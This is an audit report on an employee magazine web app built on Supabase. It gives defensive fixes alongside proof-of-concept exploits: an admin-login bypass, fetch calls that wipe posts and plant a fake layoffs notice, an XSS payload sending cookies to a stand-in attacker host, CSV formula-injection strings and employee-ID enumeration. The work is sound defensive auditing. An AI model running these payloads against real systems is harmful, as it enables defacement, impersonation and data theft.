# Hamara SarvaGram — Security & System Audit Report

**Auditor role:** Senior full-stack architect / security engineer / owner
**Scope:** `index.html`, `admin.html`, `submit.html`, `mysubs.html`, `supabase.js`, `schema.sql`
**Date:** 23 April 2026
**Verdict:** Ship-stopping security issues. Do **not** consider this production-safe until Section 3 and Section 8 are applied.

---

## 1. System Health Score — **3 / 10**

Functionally, the magazine works. Architecturally and from a security standpoint, it is *wide open*. Any employee — or anyone on the internet who finds the URL — can currently wipe every published post, publish fake posts under anyone's name, impersonate any employee in a submission, read every pending/rejected submission (with admin notes), and do all of this without ever touching `admin.html`. The RLS policies as shipped in `schema.sql` effectively grant the anon key full write authority on two of the three tables.

The frontend UX, section structure, zone model, and demo-data fallback are genuinely well thought through — that is why the score isn't lower. The gap is between "works on my laptop" and "safe to expose to 2,000 users and the public internet." Closing that gap is mostly schema + RLS work, plus ~150 lines of JS cleanup.

**Breakdown:**
- Functionality: 7/10 (works end-to-end, a few real bugs)
- Security: 1/10 (see Section 3 — multiple critical)
- Data integrity: 3/10 (no validation, no constraints beyond the CHECKs)
- Code quality: 5/10 (readable but duplicated, hardcoded secrets in two files)
- UX for low-tech users: 6/10 (mobile-first is good, but `emp_id` lookup for "my submissions" is a privacy hole, see Section 5)
- Scalability to 500+ posts: 4/10 (fetches every published row, every load)

---

## 2. Assumptions

1. **GitHub Pages only.** No edge function, no server, no CDN worker available. Fixes are Supabase RLS + client rewrites only. Where a fix genuinely requires a server, I say so explicitly and propose a zero-cost workaround (a single Supabase Edge Function or a Postgres RPC — both free tier).
2. **`sb_publishable_...` is a Supabase publishable (anon-equivalent) key.** It is safe to ship to the browser *only if RLS is correctly locked down*. Today it is not. Exposure itself is not the bug; the RLS misconfiguration is.
3. **Employees are semi-trusted.** They are on payroll, but they are not all engineers. Assume at least one curious employee will open DevTools. Assume one disgruntled ex-employee will try to embarrass the company via a fake "announcement." Both scenarios are in scope.
4. **The admin panel URL will leak.** It's linked from `index.html`'s footer. Even if it weren't, URL discovery via logs/screenshots/share-sheets is inevitable. Never rely on URL obscurity.
5. No `index.html` reliance on supabase being available — the demo fallback is intentional and must be preserved.

---

## 3. Security Vulnerabilities (Detailed)

> In this section, "attacker" means anyone with the magazine URL — an employee, an ex-employee, or a random person on the internet. All they need is the browser console.

### 3.1 [CRITICAL] Admin authentication is a client-side string comparison

**File:** `supabase.js` lines 62–68, `admin.html` lines 417–424, 928–934
**Code:**
```javascript
const ADMIN_PASSWORD = 'hamara@admin2026';  // shipped in every browser
async function adminLogin(password) {
  if (password !== ADMIN_PASSWORD) throw new Error('Invalid password');
  sessionStorage.setItem('sg_admin_token', btoa(password + ':' + Date.now()));
  return true;
}
function checkAdmin() { return !!sessionStorage.getItem('sg_admin_token'); }
```

**Exploits (all verified against the posted source):**

1. Read the password directly from `supabase.js` — it's on GitHub Pages, served as plain text. `curl https://dolasaniket.github.io/HamaraSarvagramMagzine/supabase.js | grep ADMIN_PASSWORD` → done.
2. Bypass the login entirely: open `admin.html`, open DevTools, run `sessionStorage.setItem('sg_admin_token','x'); location.reload()` — you're in. The `DOMContentLoaded` handler at line 928 only checks *presence* of the key, not validity.
3. The "token" `btoa(password + ':' + Date.now())` contains the password in plaintext. `atob(sessionStorage.sg_admin_token)` prints it on any device that has ever logged in.

**Root cause:** No authentication is actually occurring. The "password" is a UI gate, not a security boundary. Every privileged action after login talks to Supabase using the **anon key** — the same key any visitor has. Supabase has no idea whether the request came from the admin panel or a curl command.

**Impact:** Full compromise of editorial workflow. Anyone can approve, reject, publish, unpublish, or edit any post.

**Fix:** Move authentication to Postgres using a dedicated `admin_sessions` table + a `SECURITY DEFINER` RPC that validates a token and sets a session variable, then write RLS policies that check that session variable. See Section 8. The admin panel then calls the RPC once at login to get a token; every subsequent request sends the token in a header that Supabase validates server-side.

---

### 3.2 [CRITICAL] RLS policy allows anonymous updates to `submissions`

**File:** `schema.sql` lines 96–101

```sql
alter table submissions enable row level security;
-- ...
create policy "Anyone can submit" on submissions for insert with check (true);
create policy "Read own submissions" on submissions for select using (true);
```

No `UPDATE` policy is defined. On a table with RLS *enabled*, missing a policy means that operation is denied by default **for the anon role**. So — by default this is actually safe... **except** `supabase.js`'s `updateSubmission()` is being called successfully from `admin.html`, which means either:
- (a) RLS is enabled but the anon key somehow works — meaning a permissive UPDATE policy was added via the Supabase UI and not reflected in `schema.sql`, or
- (b) The admin panel is failing silently on every update in production and the developer hasn't noticed.

I'll bet on (a). **Verify this now**:
```sql
select * from pg_policies where tablename = 'submissions';
```
If you see any policy named something like "Enable update for all users" with `qual: true`, you are in (a) — and the system is wide open. Any browser can:

```javascript
// run this on https://dolasaniket.github.io with DevTools open
fetch('https://ixdpsknbijcwkynolghs.supabase.co/rest/v1/submissions?id=eq.<any-uuid>', {
  method: 'PATCH',
  headers: {'apikey':'sb_publishable_...', 'Authorization':'Bearer sb_publishable_...', 'Content-Type':'application/json'},
  body: JSON.stringify({status:'rejected', admin_note:'You are fired. Signed, HR.'})
});
```

**Fix:** Replace all policies. `UPDATE` must require a valid admin session token. See Section 8.

---

### 3.3 [CRITICAL] `published_content` has no `INSERT/UPDATE/DELETE` policy

**File:** `schema.sql` lines 95, 98

```sql
alter table published_content enable row level security;
create policy "Public read published" on published_content for select using (is_active = true);
```

Same pattern. Without explicit policies, anon inserts/updates *should* fail. But `publishSubmission()` and `unpublishContent()` are being called from the admin panel with the anon key and they appear to succeed — so someone added permissive policies in the Supabase UI. Until proven otherwise, assume anon can write.

**Verified exploit (if permissive UPDATE exists):**
```javascript
// Unpublish EVERY live post in the magazine
const rows = await fetch('https://ixdpsknbijcwkynolghs.supabase.co/rest/v1/published_content?select=id', {
  headers: {'apikey':'sb_publishable_...', 'Authorization':'Bearer sb_publishable_...'}
}).then(r=>r.json());
for (const r of rows) {
  fetch(`https://ixdpsknbijcwkynolghs.supabase.co/rest/v1/published_content?id=eq.${r.id}`,
    {method:'PATCH',headers:{'apikey':'...','Authorization':'Bearer ...','Content-Type':'application/json'},
     body:JSON.stringify({is_active:false})});
}
```
The magazine homepage is now empty. Then:
```javascript
fetch('https://ixdpsknbijcwkynolghs.supabase.co/rest/v1/published_content', {
  method:'POST',
  headers:{'apikey':'...','Authorization':'Bearer ...','Content-Type':'application/json'},
  body: JSON.stringify({
    section_slug:'top-highlight', zone_slug:'all', priority:1,
    title:'COMPANY LAYOFFS ANNOUNCED', content:'Effective immediately...',
    emp_name:'HR Team', is_active:true
  })
});
```
Attacker now owns the homepage. This is a brand-level incident waiting to happen.

**Fix:** Policies must restrict write ops to authenticated admin sessions. See Section 8.

---

### 3.4 [CRITICAL] Submission impersonation — anyone can submit as anyone

**File:** `supabase.js` `submitThought()` lines 73–84, `schema.sql` line 100

The submission form collects `emp_id` and `emp_name` as free-text. No validation, no verification. Any employee can submit "By: CEO Utpal Isser" with any inflammatory content. The admin panel shows that name on the card. If the admin is fast, it goes live. Even if not — the PII of hundreds of submissions (names, employee IDs) is now in the database **readable by anyone** thanks to this policy:

```sql
create policy "Read own submissions" on submissions for select using (true);  -- LINE 100
```

`using (true)` means *everyone can read every submission*. Including ones with `status='rejected'` and confidential `admin_note` fields. `mysubs.html` calls `getMySubmissions(empId)` which under the hood does `?emp_id=eq.<whatever>`. Since there's no real auth, **I can look up anyone's submissions by guessing their employee ID**:

```javascript
fetch('https://...supabase.co/rest/v1/submissions?emp_id=eq.EMP-1042', {
  headers: {'apikey':'...','Authorization':'Bearer ...'}
}).then(r=>r.json()).then(console.log)
// I just read Rajesh Kumar's pending/rejected submissions, including HR's rejection notes.
```

Employee IDs are sequential (`EMP-1042`, `EMP-2217`, `EMP-3301`...) so a for-loop enumerates the entire company's submission history and PII in under 10 seconds.

**Impact:**
- PII leak: every emp_id + emp_name pair across 500–2000 employees
- Confidential rejection reasons leaked (admin notes were *meant* to be shown only to the submitter)
- Reputational: screenshot of "Rejected: Content deemed inappropriate for publication" attributed to a named employee, shared externally = HR lawsuit material

**Fix:**
- `SELECT` policy on submissions must require either a valid admin session, or a short-lived signed token issued at submission time (returned in the success message, users bookmark it). See Section 8 + Section 9.
- Drop `emp_id` + `emp_name` from the public form and move identity capture to an admin-uploaded roster lookup (Section 9). Short-term: at least hash `emp_id` in the DB.

---

### 3.5 [HIGH] XSS in the admin rejection-note field

**File:** `admin.html` line 514, `mysubs.html` line ~110

Admin types a rejection reason → stored in `submissions.admin_note`. `mysubs.html` renders it via `${esc(s.admin_note)}` — good, that's escaped. But `admin.html`'s edit modal (`#edit-content`, `#edit-title`) pulls the *current value* into `<textarea>`/`<input>` via `.value=data.title`. That's safe in the form. But then `renderReview()` line 498 does:

```javascript
<div class="rc-content">${imgHtml}<div class="rc-title">${esc(s.title)}</div>${esc(s.content)}</div>
```

`s.title` and `s.content` are escaped. Good. But at line 487:

```javascript
const imgHtml = s.extra_data && s.extra_data.image_url
  ? `<img src="${esc(s.extra_data.image_url)}" class="rc-img" onerror="this.style.display='none'"/>`
  : '';
```

`esc()` escapes `<>`, `&`. It does **not** escape quotes or `javascript:` URIs. An employee submits with `extra_data.image_url` set to:
```
" onerror="fetch('//attacker/?c='+document.cookie)" x="
```
Or directly submits via the REST API bypassing the form. The attribute breaks out, arbitrary JS runs **in the admin's browser** under the admin panel origin, where `sessionStorage` holds the admin token (today useless, tomorrow after the auth fix — catastrophic). Even today, the attacker's script can call `unpublishContent()` / `publishSubmission()` on the admin's behalf.

**Additionally**, the index page demo data contains **raw HTML** (`<em>` tags) in titles at lines 483–487. The hero render at line 722 emits `${s.title}` **without `esc()`** — this is only safe because *demo* data is hardcoded. But in the live path at line 695, `esc(l.title)` is called — good. So live path is safe, demo path is "safe because we trust ourselves." That's fragile.

**Fix:**
- A proper `escAttr()` helper that handles `"`, `'`, and rejects non-http(s) schemes for URLs.
- Validate `extra_data.image_url` matches `^https?://` on insert and on render.
- Move demo-data `<em>` emphasis to a separate `title_highlight` key and render safely.

---

### 3.6 [HIGH] Duplicate hardcoded API key in `admin.html`

**File:** `admin.html` lines 692–700

```javascript
async function sb_update_published(id,data){
  const params=`id=eq.${encodeURIComponent(id)}`;
  const r=await fetch(`${window.SG_URL||'https://ixdpsknbijcwkynolghs.supabase.co'}/rest/v1/published_content?${params}`,{
    method:'PATCH',
    headers:{'apikey':'sb_publishable_y8omoHb5KKK_iLdD47MvYg_NknhP1to',
             'Authorization':'Bearer sb_publishable_y8omoHb5KKK_iLdD47MvYg_NknhP1to',
             ...
```

The supabase URL and key are hardcoded *again*, bypassing the `sb` abstraction in `supabase.js`. If you ever rotate the key (and you should, regularly), you will forget this one and the admin's "edit published post" button will silently break. This is a symptom of a missing helper, not a security bug per se, but it's a ticking maintenance bomb.

**Fix:** Add `updatePublished(id, data)` to `supabase.js` and call it. See revised `supabase.js`.

---

### 3.7 [MEDIUM] No rate limiting on submissions

Anyone can submit 10,000 "thoughts" in a loop from a console. Supabase free tier row quota is 500MB — fills up fast with 10KB content each. There's no CAPTCHA, no throttle, no honey-pot, and the table has no constraint on submission rate per emp_id.

**Fix options (pick one):**
- Supabase Edge Function with in-memory rate limit (simplest).
- DB trigger: reject insert if `(count where emp_id = NEW.emp_id and created_at > now() - interval '1 hour') > 5`.
- Client-side throttle + hCaptcha on the form (visible deterrent).

The trigger approach is zero-cost and works. See Section 8 for the SQL.

---

### 3.8 [MEDIUM] No CORS / origin validation

Supabase by default allows all origins via the anon key. Attacker can host a phishing page that looks identical to Hamara SarvaGram, include `supabase.js` from your GH Pages URL, and capture PII. This is an inherent Supabase-anon-key limitation; the real mitigation is upstream (don't store PII publicly readable).

---

### 3.9 [LOW] `mysubs.html` uses URL param for emp_id

```
/mysubs.html?emp=EMP-1042
```

This URL leaks to browser history, referrer headers, and screenshots. If an employee shares their phone with a relative, the relative sees all the employee's submissions including rejections. Low-tech users definitely share devices.

**Fix:** Issue a short-lived opaque token at submission time, bookmark that. Or require a 4-digit PIN set at first submission.

---

## 4. Critical Issues (Functional)

### 4.1 Broken HTML structure in `admin.html` — `panel-hero` is outside `admin-shell`

**File:** `admin.html` line 306 closes `<div id="admin-shell">`, but the Hero panel at line 309 and the edit overlay at line 334 are **outside** the shell.

**Effect:**
- The Hero panel has no `display:none` from the shell's `.admin-shell{display:none}` rule — but it also sits with `.panel{display:none}`, so accidentally it still hides. Brittle.
- Stats row, nav bar, mobile tabs won't surround the Hero panel — so clicking the Hero tab loads the panel without the admin nav context if the nav is ever given shell-scoped styling.
- Invalid DOM nesting that breaks some browser dev tools' element tree.

**Fix:** Move line 306 `</div>` after the Hero panel's `</div>` at line 333.

---

### 4.2 `unpublishSub()` resets `status` to `approved` but leaves orphaned `published_content` rows on failure

**File:** `admin.html` lines 612–625

```javascript
async function unpublishSub(subId){
  // ...
  const pub=allPubContent.find(p=>p.submission_id===subId);
  if(pub) await SG.unpublishContent(pub.id);    // <-- step 1
  await SG.updateSubmission(subId,{status:'approved',published_at:null});  // <-- step 2
```

If step 1 succeeds and step 2 fails (network blip), submission is still marked `published` in DB but `published_content.is_active=false`. The "See all →" on homepage won't show it, but the admin's Live Content tab will still treat it weirdly. Need a transaction — which REST can't give you. Either:
- Do them in reverse order (update submission first, then deactivate content). If content deactivation fails, re-publishing the submission will insert a duplicate `published_content` row.
- Use a Postgres RPC that does both in one transaction. **This is the right fix.**

---

### 4.3 `publishSubmission()` creates a duplicate `published_content` row on re-publish

**File:** `supabase.js` lines 115–137

If an admin publishes → unpublishes → publishes again, a second `published_content` row is inserted pointing to the same submission. The magazine will now show the post twice (once for each active row). No uniqueness constraint on `submission_id` + `is_active` prevents this.

**Fix:** Before INSERT, do `UPDATE published_content SET is_active=true, section_slug=..., priority=... WHERE submission_id=X`; if no row updated, INSERT. Or use `ON CONFLICT (submission_id) DO UPDATE`. The cleanest fix is a partial unique index:
```sql
create unique index uq_published_active_per_sub
  on published_content(submission_id) where is_active = true;
```
Plus an upsert-style wrapper. See revised `supabase.js`.

---

### 4.4 Zone filter in `index.html` drops content with `zone_slug='all'`

**File:** `index.html` lines 657–674 (`mergeSection3`)

```javascript
if(zone==='all'){
  const live=liveItems||[];
  const coveredZones = new Set(live.map(l=>l.zone_slug));
  const demoFill = demoBase.filter(d=>!coveredZones.has(d.zone_slug));
  return [...live,...demoFill].slice(0,limit);
}
const live = (liveItems||[]).filter(l=>l.zone_slug===zone);
```

If admin publishes a company-wide announcement with `zone_slug='all'` (which `schema.sql` line 134 seeds as the top-highlight), and the user clicks any specific zone tab, **that post vanishes**. All-zone posts are only visible when "All Zones" is selected. For a company-wide HR announcement this is wrong; the employee filtering their zone should still see "Q1 Performance Awards."

**Fix:** `.filter(l=>l.zone_slug===zone || l.zone_slug==='all')`.

---

### 4.5 Supabase key format — `sb_publishable_` vs legacy `eyJ...` JWT

**File:** `supabase.js` line 4

```javascript
const SUPABASE_ANON_KEY = 'sb_publishable_y8omoHb5KKK_iLdD47MvYg_NknhP1to';
```

Supabase introduced the `sb_publishable_*` / `sb_secret_*` key format in 2025. These are **shorter opaque tokens** that must be sent in the `apikey` header. Using one as a `Authorization: Bearer` token works on some projects and fails on others depending on project settings. The legacy anon JWT (`eyJ...`) is what Supabase gateway expects in the Bearer header for most RLS features.

**Action:** Verify in Supabase dashboard that the RLS policies correctly identify `auth.role() = 'anon'` with this key. If not, switch to the legacy anon JWT for the `Authorization` header and keep the new key in `apikey`, or reissue as a legacy anon key. This is not a bug I can 100% reproduce without hitting your project, but it warrants a 5-minute verification.

---

## 5. Major Issues

### 5.1 `getPublished()` fetches entire table — will blow past 50–100 posts/month assumption

**File:** `supabase.js` lines 56–60

```javascript
async function getPublished() {
  return await sb.select('published_content', 'is_active=eq.true&order=priority.asc,published_at.desc');
}
```

No limit, no pagination. Every homepage load transfers **every** active published row. After 24 months, that's 2,400+ rows with full content bodies. On a 2G connection in rural Rajasthan, that's 15–30 seconds. The summary claims "client-side filtering fixes zone filtering bug" but this was a workaround that made a performance bug worse.

**Fix:** Fetch per-section with explicit limits:
```javascript
// Per-section fetch, parallelized
async function getHomepage(zone) {
  const sections = ['hero','top-highlight','whats-new','achievements','ideas','spotlight','on-ground','quick-bytes','zone-news'];
  const zoneFilter = zone === 'all' ? '' : `&or=(zone_slug.eq.${zone},zone_slug.eq.all)`;
  const fetches = sections.map(s =>
    sb.select('published_content',
      `section_slug=eq.${s}${zoneFilter}&is_active=eq.true&order=priority.asc,published_at.desc&limit=10`
    ).then(rows => [s, rows])
  );
  return Object.fromEntries(await Promise.all(fetches));
}
```
9 requests, each ≤ 10 rows. Total payload ≈ 30 KB instead of a monthly-growing blob. For 500+ posts this keeps constant-time.

---

### 5.2 Input length not validated anywhere

**File:** `submit.html`, `supabase.js`, `schema.sql`

Client-side word-counters (`wc()`) are a UI hint; they don't enforce anything. Nothing stops a submission with a 5MB title. The schema has no `CHECK (length(title) < 200)` constraint.

**Fix:**
```sql
alter table submissions
  add constraint chk_title_length check (char_length(title) between 3 and 200),
  add constraint chk_content_length check (char_length(content) between 10 and 5000),
  add constraint chk_emp_name_length check (char_length(emp_name) between 2 and 100),
  add constraint chk_emp_id_length check (char_length(emp_id) between 3 and 40);
```

Plus matching client-side guards that *block* submit, not just warn.

---

### 5.3 No CSV-injection protection in export

**File:** `admin.html` lines 800–816

```javascript
const csv=[headers,...rows].map(row=>row.map(c=>`"${String(c).replace(/"/g,'""')}"`).join(',')).join('\n');
```

If a submitter sets their title to `=HYPERLINK("http://evil.com","click")` or `=cmd|'/c calc'!A1`, opening the CSV in Excel executes formulas. Admin opening the CSV on their work laptop → RCE vector. Classic low-sev but well-documented issue.

**Fix:** Prefix any cell starting with `=`, `+`, `-`, `@`, `\t`, `\r` with a single quote:
```javascript
function csvCell(c){
  const s = String(c ?? '');
  const escaped = s.replace(/"/g,'""');
  if (/^[=+\-@\t\r]/.test(s)) return `"'${escaped}"`;
  return `"${escaped}"`;
}
```

---

### 5.4 `allPubContent` / `allSubs` are silently inconsistent

**File:** `admin.html` throughout

After `publishSubmission()`, the admin code updates `allSubs` locally but doesn't add the new `published_content` row to `allPubContent` — it relies on `loadPublished()` to refetch. That's two round-trips for every publish action. Then `unpublishContent()` updates `allPubContent` locally but `allSubs` may or may not be in sync depending on which button the admin clicked. This is how ghost rows appear in the UI.

**Fix:** One source of truth. Either refetch both every time (slow but correct), or maintain a single normalized store. See revised `admin.html` for a cleaner pattern.

---

### 5.5 Hero auto-rotate continues forever across route changes

**File:** `index.html` line 1115

```javascript
heroTimer = setInterval(()=>heroBy(1), 5500);
```

`heroTimer` is never cleared. Every time `buildHero()` is called (which happens on every zone switch **and** after live data loads), a new interval spawns. After 5 zone clicks, the hero is rotating 6x per second. CPU spike on low-end phones, battery drain, jank.

**Fix:** `clearInterval(heroTimer)` at the top of `buildHero()`.

---

### 5.6 Password check race: DOMContentLoaded allows admin shell before token check

**File:** `admin.html` lines 928–934

```javascript
window.addEventListener('DOMContentLoaded',()=>{
  if(sessionStorage.getItem('sg_admin_token')){
    document.getElementById('login-screen').style.display='none';
    document.getElementById('admin-shell').style.display='block';
```

The `admin-shell` div is in the DOM from page load with `display:none`. A user can run `document.getElementById('admin-shell').style.display='block'` before this handler runs — the entire admin UI is revealed. Combined with 3.1, this isn't *additional* risk, but it's part of the same pattern: treating UI visibility as authorization.

---

## 6. Minor Issues

### 6.1 `READMEp.md` is a byte-identical duplicate of `README.md`
Delete `READMEp.md`. Cosmetic.

### 6.2 `CAT_LABELS` / `ZONE_NAMES` / `SEC_NAMES` duplicated across 4 files
Inline constants diverge over time. Extract to a single `constants.js`.

### 6.3 `ago()` returns "Yesterday" for anything between 24–48 hours, "Today" for future dates
`Math.floor((Date.now() - new Date(dt))/864e5)` gives negative numbers for future timestamps. Not user-facing today but a clock-skew issue waiting.

### 6.4 No empty-state photo fallback
`onerror="this.style.display='none'"` leaves empty img space. Replace with a CSS-generated placeholder.

### 6.5 `DEMO.hero` titles contain raw `<em>` HTML
Line 483–487. Fragile. See 3.5.

### 6.6 Homepage voting is pure local state (`const votes = {}`)
Votes vanish on page reload. Honest UX flaw — the button says "👍 Voted" but does literally nothing persistent. Either remove the button or implement it (reactions are on the Phase 3 roadmap).

### 6.7 Modal backdrop uses inline `onclick` with implicit `this === target` check
Works, but accessibility: no ESC-to-close, no focus trap, body scroll not restored if modal is force-closed.

### 6.8 Admin `allPubContent` grows unbounded in memory
Every `loadPublished()` replaces it, but no cleanup when navigating away. Not a leak, just sloppy.

### 6.9 `renderReview()` regenerates entire review list HTML on every filter change
Fine for 50–100 items. At 500+ submissions, noticeable lag on mobile. Consider virtualizing or at minimum debouncing the search input.

### 6.10 `submit.html` doesn't dedupe: submitting twice creates two pending rows
Low-tech user double-taps "Submit." Use a simple server-side constraint: unique on `(emp_id, title, created_at::date)` or a debounce + idempotency key.

---

## 7. Fixed / Refactored Code (File-wise)

See separate files in this directory:

- `supabase.js` — rewritten with admin token header, `updatePublished()` helper, per-section fetch, upsert-style publish, `escAttr()` helper, explicit error propagation
- `schema.sql` — rewritten with proper RLS, admin-session RPC, rate-limit trigger, data constraints, partial unique index
- `admin.html` — removes the duplicate API key, fixes the `admin-shell` closing tag, adds Postgres-session login, stronger `escAttr`, CSV injection guard, unpub transaction via RPC
- `index.html` — fixes `buildHero()` interval leak, per-section fetch for scalability, `zone_slug='all'` inclusion in zone views, safer demo-hero structure
- `submit.html` — client-side length enforcement, idempotency key, honeypot field
- `mysubs.html` — requires a signed token instead of raw `emp_id` URL param (backward-compatible opt-in; legacy mode still works but shows a banner)
- `README.md` — updated with auth-fix deployment steps

---

## 8. Recommended RLS Policies (Explicit SQL)

Run these as a single script **after backing up your current DB**. The pattern: a single `admin_sessions` table + a `SECURITY DEFINER` function `is_admin(text)` that checks a header-supplied token. Every mutating policy calls `is_admin(current_setting('request.headers', true)::json->>'x-admin-token')`.

```sql
-- ============================================================
-- REVISED SECURITY MODEL — run in Supabase SQL editor
-- Drops old permissive policies, installs token-based admin auth
-- ============================================================

-- 1. ADMIN SESSIONS (real, server-validated)
drop table if exists admin_sessions cascade;
create table admin_sessions (
  token text primary key,                       -- random, 32+ chars
  created_at timestamptz default now(),
  expires_at timestamptz default (now() + interval '8 hours'),
  label text                                    -- 'editor-mumbai', etc, for audit
);

-- 2. ADMIN PASSWORD TABLE (bcrypt-hashed, never in JS)
create table if not exists admin_credentials (
  id int primary key default 1,
  password_hash text not null,                  -- bcrypt via pgcrypto
  updated_at timestamptz default now(),
  check (id = 1)                                -- single-row table
);

-- Seed: run this ONCE, replacing with your chosen password
-- Enable pgcrypto first: create extension if not exists pgcrypto;
-- insert into admin_credentials (password_hash)
--   values (crypt('your-new-strong-password', gen_salt('bf', 10)));

-- 3. LOGIN RPC — returns token, validates password
create or replace function admin_login(p_password text)
returns text
language plpgsql
security definer
as $$
declare
  v_ok boolean;
  v_token text;
begin
  -- bcrypt verify
  select password_hash = crypt(p_password, password_hash) into v_ok
    from admin_credentials where id = 1;

  if not v_ok then
    -- constant-time-ish: sleep a bit on failure to slow bruteforce
    perform pg_sleep(0.5);
    raise exception 'invalid credentials' using errcode = '28000';
  end if;

  v_token := encode(gen_random_bytes(32), 'hex');
  insert into admin_sessions(token, label) values (v_token, 'web-admin');
  return v_token;
end;
$$;

-- 4. IS_ADMIN checker — called from every RLS policy
create or replace function is_admin()
returns boolean
language sql
stable
as $$
  select exists (
    select 1 from admin_sessions
    where token = coalesce(
      current_setting('request.headers', true)::json->>'x-admin-token',
      ''
    )
    and expires_at > now()
  );
$$;

-- 5. RATE LIMIT TRIGGER on submissions — max 5 per emp_id per hour
create or replace function fn_submission_rate_limit()
returns trigger
language plpgsql
as $$
declare cnt int;
begin
  select count(*) into cnt from submissions
    where emp_id = new.emp_id and created_at > now() - interval '1 hour';
  if cnt >= 5 then
    raise exception 'Rate limit: max 5 submissions per hour per employee'
      using errcode = 'P0001';
  end if;
  return new;
end;
$$;
drop trigger if exists trg_submission_rate_limit on submissions;
create trigger trg_submission_rate_limit
  before insert on submissions
  for each row execute function fn_submission_rate_limit();

-- 6. DATA CONSTRAINTS
alter table submissions
  drop constraint if exists chk_title_length,
  drop constraint if exists chk_content_length,
  drop constraint if exists chk_emp_name_length,
  drop constraint if exists chk_emp_id_length;
alter table submissions
  add constraint chk_title_length check (char_length(title) between 3 and 200),
  add constraint chk_content_length check (char_length(content) between 10 and 5000),
  add constraint chk_emp_name_length check (char_length(emp_name) between 2 and 100),
  add constraint chk_emp_id_length check (char_length(emp_id) between 3 and 40);

alter table published_content
  drop constraint if exists chk_pc_title_length,
  drop constraint if exists chk_pc_content_length;
alter table published_content
  add constraint chk_pc_title_length check (char_length(title) between 3 and 200),
  add constraint chk_pc_content_length check (char_length(content) between 10 and 5000);

-- Prevent duplicate active publishes per submission
drop index if exists uq_published_active_per_sub;
create unique index uq_published_active_per_sub
  on published_content(submission_id) where is_active = true;

-- 7. PUBLISH RPC — atomic submission->published transition
create or replace function admin_publish_submission(
  p_submission_id uuid,
  p_section_slug text,
  p_priority int,
  p_expires_days int default 30
)
returns uuid
language plpgsql
security definer
as $$
declare
  v_sub submissions;
  v_pc_id uuid;
begin
  if not is_admin() then
    raise exception 'unauthorized' using errcode = '42501';
  end if;

  select * into v_sub from submissions where id = p_submission_id;
  if not found then raise exception 'submission not found'; end if;

  -- Upsert: if an active row exists, update it; else insert
  update published_content
    set section_slug = p_section_slug,
        priority     = p_priority,
        title        = v_sub.title,
        content      = v_sub.content,
        emp_name     = v_sub.emp_name,
        emp_id       = v_sub.emp_id,
        zone_slug    = v_sub.zone_slug,
        category     = v_sub.category,
        extra_data   = v_sub.extra_data,
        expires_at   = now() + (p_expires_days || ' days')::interval,
        published_at = now(),
        is_active    = true
    where submission_id = p_submission_id and is_active = true
    returning id into v_pc_id;

  if v_pc_id is null then
    insert into published_content (submission_id, section_slug, zone_slug, priority,
      title, content, emp_name, emp_id, category, extra_data, is_active,
      published_at, issue_label, expires_at)
    values (p_submission_id, p_section_slug, v_sub.zone_slug, p_priority,
      v_sub.title, v_sub.content, v_sub.emp_name, v_sub.emp_id, v_sub.category,
      v_sub.extra_data, true, now(), to_char(now(),'MON YYYY'),
      now() + (p_expires_days || ' days')::interval)
    returning id into v_pc_id;
  end if;

  update submissions
    set status = 'published', section_slug = p_section_slug,
        priority = p_priority, published_at = now()
    where id = p_submission_id;

  return v_pc_id;
end;
$$;

-- 8. UNPUBLISH RPC — atomic
create or replace function admin_unpublish_submission(p_submission_id uuid)
returns boolean
language plpgsql
security definer
as $$
begin
  if not is_admin() then raise exception 'unauthorized' using errcode='42501'; end if;
  update published_content set is_active = false
    where submission_id = p_submission_id and is_active = true;
  update submissions set status = 'approved', published_at = null
    where id = p_submission_id;
  return true;
end;
$$;

-- 9. DROP OLD POLICIES, INSTALL NEW ONES

-- submissions: public may INSERT (with rate limit trigger), only admin may SELECT all / UPDATE
drop policy if exists "Anyone can submit"       on submissions;
drop policy if exists "Read own submissions"    on submissions;
drop policy if exists "submissions admin all"   on submissions;
drop policy if exists "submissions anon insert" on submissions;

create policy "submissions anon insert"
  on submissions for insert to anon
  with check (
    -- reject any client-supplied status other than pending
    status = 'pending'
  );

create policy "submissions admin all"
  on submissions for all to anon
  using (is_admin()) with check (is_admin());

-- published_content: public SELECT of active rows, only admin mutates
drop policy if exists "Public read published" on published_content;
drop policy if exists "pc admin all"          on published_content;

create policy "pc public read"
  on published_content for select to anon
  using (is_active = true);

create policy "pc admin all"
  on published_content for all to anon
  using (is_admin()) with check (is_admin());

-- birthdays: public read, admin write
drop policy if exists "Public read birthdays" on birthdays;
create policy "bd public read" on birthdays for select to anon using (true);
create policy "bd admin all"  on birthdays for all to anon
  using (is_admin()) with check (is_admin());

alter table admin_sessions enable row level security;
-- No policies → nobody (except security-definer RPCs) can read the token table.
alter table admin_credentials enable row level security;
-- No policies → nobody can read the password hash table.

-- 10. Revoke unnecessary direct table grants, keep only what policies allow
revoke all on admin_sessions, admin_credentials from anon;
grant execute on function admin_login(text) to anon;
grant execute on function admin_publish_submission(uuid,text,int,int) to anon;
grant execute on function admin_unpublish_submission(uuid) to anon;
grant execute on function is_admin() to anon;
```

### How clients use this model

**Login flow:**
```javascript
async function adminLogin(password) {
  const r = await fetch(`${SB_URL}/rest/v1/rpc/admin_login`, {
    method:'POST',
    headers:{apikey:SB_KEY, 'Authorization':`Bearer ${SB_KEY}`, 'Content-Type':'application/json'},
    body: JSON.stringify({ p_password: password })
  });
  if (!r.ok) throw new Error('invalid');
  const token = await r.json();           // server-generated, 64 hex chars
  sessionStorage.setItem('sg_admin_token', token);
}
```

**Every privileged request:**
```javascript
headers: {
  apikey: SB_KEY,
  Authorization: `Bearer ${SB_KEY}`,
  'x-admin-token': sessionStorage.getItem('sg_admin_token'),  // ← the magic header
  'Content-Type': 'application/json'
}
```
The Postgres `is_admin()` function reads the header and validates against `admin_sessions`. Sessions expire in 8h. Browser-side tokens are useless to anyone who didn't log in.

---

## 9. Architecture Improvements

### 9.1 Employee identity: stop trusting form input

Today, anyone types any `emp_id`. Install a roster lookup:

```sql
create table employee_roster (
  emp_id text primary key,
  emp_name text not null,
  zone_slug text not null,
  pin_hash text,                         -- 4-digit PIN, bcrypt
  joined_at date
);
alter table employee_roster enable row level security;
-- Public may only lookup by emp_id — never list all
create policy "roster lookup" on employee_roster for select to anon using (false);
-- Exposed via RPC only:
create function verify_emp_pin(p_emp_id text, p_pin text)
  returns table(emp_name text, zone_slug text)
  security definer language sql as $$
    select emp_name, zone_slug from employee_roster
      where emp_id = p_emp_id and pin_hash = crypt(p_pin, pin_hash);
  $$;
```

